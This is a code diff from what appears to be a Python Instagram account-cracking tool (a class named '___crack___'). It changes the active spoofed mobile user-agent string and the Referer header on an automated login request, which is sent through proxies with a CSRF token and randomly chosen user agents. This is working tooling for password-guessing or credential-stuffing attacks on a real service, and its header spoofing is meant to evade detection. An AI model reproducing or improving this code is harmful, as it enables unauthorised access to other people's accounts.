@@ -408,8 +408,8 @@ class ___crack___:
         try:
             ___useragent = open('Data/ua.txt', 'r').read()
         except (IOError):
-            #___useragent = ('Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36')
-            ___useragent = ('Mozilla/5.0 (Linux; Android 12; SM-S908U1 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 Instagram 243.0.0.16.111 Android (31/12; 420dpi; 1080x2115; samsung; SM-S908U1; b0q; qcom; en_US; 382290489)')
+            ___useragent = ('Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36')
+            #___useragent = ('Mozilla/5.0 (Linux; Android 12; SM-S908U1 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 Instagram 243.0.0.16.111 Android (31/12; 420dpi; 1080x2115; samsung; SM-S908U1; b0q; qcom; en_US; 382290489)')
             #___useragent = ('Mozilla/5.0 (Linux; Android 11; GM1915 Build/RKQ1.201022.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 Instagram 245.0.0.18.108 Android (30/11; 600dpi; 1440x2910; OnePlus; GM1915; OnePlus7ProTMO; qcom; en_US; 385415781')
             #___useragent = ('Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 3 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 43.0.0.10.97 Android (21/5.0.2; 480dpi; 1080x1920; Xiaomi; Redmi Note 3; hennessy; mt6795; ru_RU; 105842053')
             #___useragent = ('Mozilla/5.0 (Linux; Android 9; Mi A3 Build/PKQ1.190416.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.111 Mobile Safari/537.36 Instagram 138.0.0.28.117 Android (28/9; 320dpi; 720x1411; Xiaomi; Mi A3; laurel_sprout; qcom; fr_FR; 210180521')
@@ -426,7 +426,7 @@ class ___crack___:
                 'optIntoOneTap': 'false'}
                 ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
                 'X-Requested-With': 'XMLHttpRequest',
-                'Referer': 'https://z-p42.www.instagram.com/accounts/login/',
+                'Referer': 'https://i.instagram.com/api/v1/accounts/login/',
                 'x-csrftoken': ___csrf}
                 with requests.Session() as ses:
                     response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
